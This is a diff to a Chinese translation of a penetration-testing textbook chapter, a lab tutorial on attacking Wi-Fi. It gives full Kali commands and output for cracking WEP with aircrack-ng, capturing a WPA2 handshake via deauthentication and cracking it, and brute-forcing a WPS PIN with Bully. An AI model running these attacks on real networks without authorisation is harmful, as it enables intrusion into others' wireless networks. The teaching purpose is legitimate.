@@ -21,7 +21,7 @@
 示例 15-1. Kali Linux 无线接口
 
 ```
-root@kali:~# **iwconfig**
+root@kali:~# iwconfig
 wlan0❶   IEEE 802.11bg  ESSID:off/any
           Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
           Retry  long limit:7   RTS thr:off   Fragment thr:off
@@ -40,7 +40,7 @@ eth0      no wireless extensions.
 示例 15-2. 扫描附近的无线接入点
 
 ```
-root@kali:~# **iwlist wlan0 scan**
+root@kali:~# iwlist wlan0 scan
   Cell 02 - Address: 00:23:69:F5:B4:2B❶
                     Channel:6❷
                     Frequency:2.437 GHz (Channel 6)
@@ -63,7 +63,7 @@ root@kali:~# **iwlist wlan0 scan**
 示例 15-3. 检查干扰进程
 
 ```
-root@kali:~# **airmon-ng check**
+root@kali:~# airmon-ng check
 Found 2 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
 a short period of time, you may want to kill (some of) them!
@@ -78,7 +78,7 @@ PID     Name
 示例 15-4. 终止干扰进程
 
 ```
-root@kali:~# **airmon-ng check kill**
+root@kali:~# airmon-ng check kill
 Found 2 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
 a short period of time, you may want to kill (some of) them!
@@ -94,7 +94,7 @@ Killing all those processes...
 示例 15-5. 将 Alfa 卡设置为监视模式
 
 ```
-root@kali:~# **airmon-ng start wlan0**
+root@kali:~# airmon-ng start wlan0
 Interface    Chipset             Driver
 wlan0        Realtek RTL8187L    rtl8187 - [phy0]
              (monitor mode enabled on mon0) ❶
@@ -107,7 +107,7 @@ wlan0        Realtek RTL8187L    rtl8187 - [phy0]
 示例 15-6. 使用 Airodump-ng 开始数据包转储
 
 ```
-root@kali:~# **airodump-ng mon0 --channel 6**
+root@kali:~# airodump-ng mon0 --channel 6
  CH  6 ][ Elapsed: 28 s ] 2015-05-19 20:08
 
  BSSID                 PWR    Beacons    #Data, #/s   CH   MB   ENC  CIPHER AUTH ESSID
@@ -187,7 +187,7 @@ Airodump-ng 输出收集有关无线数据包的信息，包括基础服务集�
 示例 15-7. Airodump-ng 捕获用于 WEP 密码分析
 
 ```
-root@kali:~# **airodump-ng -w book mon0 --channel 6**
+root@kali:~# airodump-ng -w book mon0 --channel 6
  CH  6 ][ Elapsed: 20 s ] 2015-03-06 19:08
  BSSID                 PWR    Beacons    #Data, #/s   CH    MB   ENC    CIPHER AUTH ESSID
  00:23:69:F5:B4:2B❶   -53         22         6   0    6❷  54 . WEP❸  WEP         linksys❹
@@ -212,7 +212,7 @@ root@kali:~# **airodump-ng -w book mon0 --channel 6**
 示例 15-8. 使用 Aireplay-ng 伪造认证
 
 ```
-root@kali:~# **aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0**
+root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0
 20:02:56  Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
 
 20:02:56  Sending Authentication Request (Open System) [ACK]
@@ -248,7 +248,7 @@ root@kali:~# **aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:6
 示例 15-9. 使用 Aireplay-ng 重新广播 ARP 数据包
 
 ```
-root@kali:~# **aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0**
+root@kali:~# aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0
 20:14:21  Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
 Saving ARP requests in replay_arp-1142-201521.cap
 You should also start airodump-ng to capture replies.
@@ -288,7 +288,7 @@ BSSID               PWR  RXQ  Beacons    #Data, #/s    CH   MB   ENC    CIPHER A
 示例 15-11. 使用 Aircrack-ng 恢复 WEP 密钥
 
 ```
-root@kali:~# **aircrack-ng -b 00:23:69:F5:B4:2B book*.cap**❶
+root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.cap❶
 Opening book-01.cap
 Attack will be restarted every 5000 captured ivs.
 Starting PTW attack with 239400 ivs.
@@ -387,7 +387,7 @@ WPA/WPA2 个人连接过程比企业连接过程稍微简单一些：不需要 R
 示例 15-12. 使用 Airodump-ng 进行 WPA2 破解
 
 ```
-root@kali:~# **airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0**
+root@kali:~# airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0
 
  CH  6 ][ Elapsed: 4 s ] 2015-05-19 16:31
 
@@ -417,7 +417,7 @@ root@kali:~# **airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0**
 示例 15-13. 向客户端发送去认证请求
 
 ```
-root@kali:~# **aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0**
+root@kali:~# aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0
 16:35:11  Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
 16:35:14  Sending 64 directed DeAuth. STMAC: [70:56:81:B2:F0:53] [24|66 ACKs]
 ```
@@ -455,7 +455,7 @@ CH  6 ][ Elapsed: 2 mins ][ 2015-11-23 17:10 ] WPA handshake: 00:23:69:F5:B4:2B 
 示例 15-15. 使用 Aircrack-ng 恢复 WPA2 密钥
 
 ```
-root@kali:~# **aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap**
+root@kali:~# aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap
 Opening pentestbook2-01.cap
 
 Reading packets, please wait...
@@ -494,7 +494,7 @@ PIN 码的最后一位是前七位数字的校验和，因此密钥空间应为 
 Kali 提供了可以用于对 WPS 进行暴力破解的工具。其中一个工具是 Bully。我们可以使用 Bully 来暴力破解 WPS PIN 码，也可以测试特定的 PIN 码。使用 Bully 时，我们需要获取接入点的 SSID、MAC 地址和频道，这些信息在本章开始时我们通过 `iwlist` 获取。使用 `-b` 标志指定 MAC 地址，`-e` 标志指定 SSID，`-c` 标志指定频道，如下所示。
 
 ```
-root@kali:~# **bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6**
+root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6
 ```
 
 Bully 应该能在大约四小时内暴力破解 PIN 码，并恢复正确的预共享 PIN。许多无线接入点默认启用 WPS，且相比猜测强密码的 WPA/WPA2 密码，WPS 可能是更容易的突破口。
